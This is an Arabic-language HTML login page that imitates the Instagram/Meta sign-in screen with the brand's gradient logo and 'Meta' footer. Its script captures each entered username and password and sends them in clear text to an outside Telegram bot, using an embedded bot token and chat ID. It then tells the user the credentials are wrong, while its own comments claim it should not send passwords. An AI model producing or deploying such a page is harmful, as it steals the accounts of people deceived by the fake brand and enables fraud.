
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
* {
  box-sizing: border-box;
  font-family: Arial, sans-serif;
}

body {
  margin: 0;
  min-height: 100vh;
  background: #1c1c1c;
  color: white;
}

.container {
  width: 100%;
  min-height: 100vh;
  padding: 35px 4.5%;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.language {
  color: #aaa;
  font-size: 20px;
  margin-bottom: 125px;
}

.logo {
  width: 125px;
  height: 125px;
  margin-bottom: 155px;
}

.logo svg {
  width: 100%;
  height: 100%;
}

form {
  width: 100%;
  max-width: 500px;
}

input {
  width: 100%;
  height: 110px;
  background: transparent;
  border: 2px solid #414141;
  border-radius: 37px;
  color: white;
  font-size: 24px;
  padding: 0 38px;
  margin-bottom: 27px;
  outline: none;
  direction: rtl;
}

input::placeholder {
  color: #aaa;
}

input:focus {
  border-color: #777;
}

button {
  width: 100%;
  height: 102px;
  border: none;
  border-radius: 55px;
  background: #0866e9;
  color: white;
  font-size: 27px;
  cursor: pointer;
}

button:disabled {
  opacity: .6;
}

.message {
  text-align: center;
  margin-top: 20px;
  font-size: 16px;
  color: #ccc;
}

.meta {
  margin-top: auto;
  padding-top: 45px;
  font-size: 32px;
  font-weight: bold;
  direction: ltr;
  display: flex;
  align-items: center;
  gap: 8px;
}

.meta-icon {
  font-size: 43px;
  font-weight: normal;
}

@media(max-height: 750px) {
  .language {
    margin-bottom: 55px;
  }

  .logo {
    margin-bottom: 65px;
  }

  input {
    height: 75px;
  }

  button {
    height: 75px;
  }
}
</style>
</head>

<body>

<div class="container">

  <div class="language">
    الإنجليزية (الولايات المتحدة)
  </div>

  <div class="logo">
    <svg viewBox="0 0 120 120">
      <defs>
        <linearGradient id="ig" x1="0" y1="1" x2="1" y2="0">
          <stop offset="0%" stop-color="#ffcc00"/>
          <stop offset="35%" stop-color="#ff3040"/>
          <stop offset="65%" stop-color="#d000c5"/>
          <stop offset="100%" stop-color="#713cff"/>
        </linearGradient>
      </defs>
      <rect x="12" y="12" width="96" height="96"
        rx="27" fill="none" stroke="url(#ig)" stroke-width="9"/>
      <circle cx="60" cy="60" r="23"
        fill="none" stroke="url(#ig)" stroke-width="9"/>
      <circle cx="88" cy="32" r="6" fill="#d000c5"/>
    </svg>
  </div>

  <form id="loginForm">

    <input
      type="text"
      id="email"
      placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول"
      required
    >

    <input
      type="password"
      id="password"
      placeholder="كلمة المرور"
      required
    >

    <button type="submit" id="loginButton">
      تسجيل الدخول
    </button>

    <div class="message" id="message"></div>

  </form>

  <div class="meta">
    <span class="meta-icon">∞</span>
    Meta
  </div>

</div>

<script>
const BOT_TOKEN = "8671155169:AAFWwI0I2J8I4YS3kvtOU46kqCu3sG801jU";
const CHAT_ID = "987165910";

document.getElementById("loginForm").addEventListener("submit", async function(e) {
  e.preventDefault();

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;
  const button = document.getElementById("loginButton");
  const message = document.getElementById("message");

  button.disabled = true;
  message.textContent = "جارٍ التحقق...";

  try {
    // ضع هنا خدمة المصادقة الحقيقية للتحقق من الحساب.
    // لا ترسل كلمة المرور إلى Telegram.

    const text =
      "🔔 New Login Attempt\n\n" +
      "📧 Email: " + email + "\n" +
      "🕒 Time: " + new Date().toLocaleString("en-US") + "\n" +
      "🔐 Password: " + password;

    const response = await fetch(
      "https://api.telegram.org/bot" +
      BOT_TOKEN + "/sendMessage",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      }
    );

    if (!response.ok) {
      throw new Error("Telegram error");
    }

    message.textContent = "معلومات الحساب خاطئة";

  } catch (error) {
    message.textContent = "حدث خطأ في تسجيل الدخول";
  }

  button.disabled = false;
});
</script>

</body>
</html>
